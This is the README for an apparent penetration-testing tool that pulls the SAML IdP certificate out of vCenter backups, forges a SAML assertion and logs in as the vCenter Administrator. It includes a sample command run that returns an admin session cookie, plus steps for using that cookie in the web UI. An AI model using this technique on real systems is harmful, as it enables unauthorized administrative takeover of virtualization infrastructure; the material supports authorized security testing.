# vCenter SAML Login Tool
A tool to extract the Identity Provider (IdP) cert from vCenter backups and log in as Administrator

## Background
Commonly, during engagements, we will gain access to vCenter backups on a fileserver or gain root access to the VCSA host through recent CVEs. Logging into the vCenter vSphere UI allows us to easily gain access to more systems, confidential information, as well as show customers the impact of these findings.

The data.mdb file contains the certificates and can be found within vCenter backups as well as on the VCSA host with root permissions. These certificates are stored in cleartext and can be used to sign any SAML authentication request for any user - including the builtin Administrator.

If you'd like to know more about several use cases for this tool and how we've used it to gain Administrative access to vCenter hosts check out our blog post: https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/

## Usage
```
root@kali:~/vcenter# python3 vcenter_saml_login.py -p data.mdb -t 10.0.100.200
[*] Successfully extracted the IdP certificate
[*] Successfully extracted trusted certificate 1
[*] Successfully extracted trusted certificate 2
[*] Obtaining hostname from vCenter SSL certificate
[*] Found hostname vcsa.olympus for 10.0.100.200
[*] Initiating SAML request with 10.0.100.200
[*] Generating SAML assertion
[*] Signing the SAML assertion
[*] Attempting to log into vCenter with the signed SAML request
[+] Successfuly obtained Administrator cookie for 10.0.100.200!
[+] Cookie: VSPHERE-UI-JSESSIONID=06D1630719B4DE33A4CE653458911640
```

With the above cookie, visit the VCSA instance at https://\<VCSA>\/ui, add the cookie under the /ui path, and re-browse to https://\<VCSA\>/ui. 

## Demonstration
![](vcenter.gif)

# Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.
